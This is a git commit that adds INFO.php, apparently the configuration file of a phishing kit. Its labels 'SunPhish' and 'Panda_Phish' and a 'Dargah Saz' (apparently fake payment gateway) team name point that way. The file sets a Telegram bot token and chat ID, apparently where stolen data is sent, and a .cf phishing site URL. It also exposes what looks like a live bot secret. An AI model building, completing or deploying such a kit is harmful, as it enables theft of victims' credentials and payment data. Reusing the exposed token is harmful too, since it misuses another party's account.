b50c203536eeadd8f01ca6349a3e9f83f6f29c5c
TRSONGIR <67713900+TRSONGIR@users.noreply.github.com>
2020-10-13 16:25:21 +0330

    master

---
+++ INFO.php
@@ -0,0 +1,26 @@
+<?php
+/*CODED BY X_KILER*/
+
+//Telegram ID Be don @
+
+$tel="SunPhish";
+
+//CHANEL Telegram Be Done @
+
+$chanel="Panda_Phish";
+
+//Token Shel & ID
+
+$TOKENS="1255180535:AAFACMBlpMftuG6Bgm0Yzio0dd03bFLHsPs";
+//ID
+$IDS="-434290999";
+//Name Dargah Saz
+
+$Team="Anabel&Panda" ;
+
+//Link site 
+$url="https://shaparralkweb.cf";
+
+
+
+?>
